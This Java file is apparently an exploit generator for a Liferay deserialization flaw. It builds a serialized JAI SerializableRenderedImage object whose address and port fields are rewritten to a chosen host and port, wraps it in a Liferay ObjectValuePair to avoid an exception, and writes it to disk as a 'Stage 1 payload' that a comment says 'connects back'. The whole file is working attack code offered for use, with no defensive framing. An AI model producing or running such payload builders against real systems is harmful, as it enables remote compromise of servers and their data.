package Test.test;

import com.liferay.portal.kernel.util.ObjectValuePair;

import org.xml.sax.*;

import java.awt.image.BufferedImage;
import java.io.*;

import javax.media.jai.remote.SerializableRenderedImage;

import com.thoughtworks.xstream.*;

import java.net.*;

import org.w3c.dom.*;

import javax.xml.parsers.*;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
/**
 * Hello world!
 *
 */


public class App 
{
	public static Document loadXMLFromString(String xml) throws Exception{
		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    	DocumentBuilder db = dbf.newDocumentBuilder();
    	InputSource is = new InputSource(new StringReader(xml));
    	return db.parse(is);
	}
	public static String toString(Document doc){
		try{
			StringWriter sw = new StringWriter();
			TransformerFactory tf = TransformerFactory.newInstance();
			Transformer transformer = tf.newTransformer();
			transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION,"no");
			transformer.setOutputProperty(OutputKeys.METHOD, "xml");
			transformer.setOutputProperty(OutputKeys.INDENT, "yes");
			transformer.setOutputProperty(OutputKeys.ENCODING, "UTF-8");
			
			transformer.transform(new DOMSource(doc), new StreamResult(sw));
			return sw.toString();
			
		}
		catch (Exception ex){
			throw new RuntimeException("Error converting to string");
		}
	}
    public static void main ( String[] args )
    {
        // Create a serializable image
    	BufferedImage image = new BufferedImage(1,1,BufferedImage.TYPE_BYTE_BINARY);
    	SerializableRenderedImage simage = new SerializableRenderedImage(image);
    	String path = "C:\\Users\\admin\\Downloads\\payload.file";
    	//Desired port
    	String port = "1337";
    	//Desired host
    	String host = "127.0.0.1";
    	InetAddress ip = null;
    	String hostXml;
    	Document hostDoc;
    	// Convert to xml
    	XStream xstream = new XStream();
    	String payloadXml = xstream.toXML(simage);
    	Document payloadDoc;
    	try{
    		ip = InetAddress.getByName(host);
        	hostXml = xstream.toXML(ip);
        	hostDoc = loadXMLFromString(hostXml);
        	payloadDoc = loadXMLFromString(payloadXml);
        	
        	/**
        	System.out.println(payloadXml);
        	System.out.println("<---------------------->");
        	*/
        	
        	//Get the address field out of the created InetAdress object
        	hostDoc.getDocumentElement().normalize();
        	Element addressField = (Element)hostDoc.getElementsByTagName("address").item(0);
        	String address = addressField.getTextContent();
        	
        	//Assign the fields the right value
        	payloadDoc.getDocumentElement().normalize();
        	Element portElement = (Element) payloadDoc.getElementsByTagName("port").item(0);
        	portElement.setTextContent(port);
        	Element addressElement = (Element) payloadDoc.getElementsByTagName("address").item(0);
        	addressElement.setTextContent(address);
        	System.out.println(toString(payloadDoc));
        	System.out.println("<---------------------->");
        	//Rebuild object from XML
        	simage = (SerializableRenderedImage) xstream.fromXML(toString(payloadDoc));
        	//Wrap the object into the ObjectValuePair in order to avoid the exception
        	ObjectValuePair<SerializableRenderedImage,Object> payload = new ObjectValuePair<SerializableRenderedImage,Object>(simage,null);
        	
        	
        	payloadXml = xstream.toXML(payload);       	
        	payloadDoc = loadXMLFromString(payloadXml);
        	System.out.println(toString(payloadDoc));

        	//Serialize the object and write to a file
        	FileOutputStream fos = new FileOutputStream(path);
        	ObjectOutputStream out = new ObjectOutputStream(fos);
        	out.writeObject(payload);
        	out.close();
        	fos.close();
        	System.out.printf("Stage 1 payload written to %s", path);
        	
    	}catch(Exception e){
    		//This won't ever happen since it connects back
    		System.err.println("lol");
    		e.printStackTrace();
    	}
    }
}
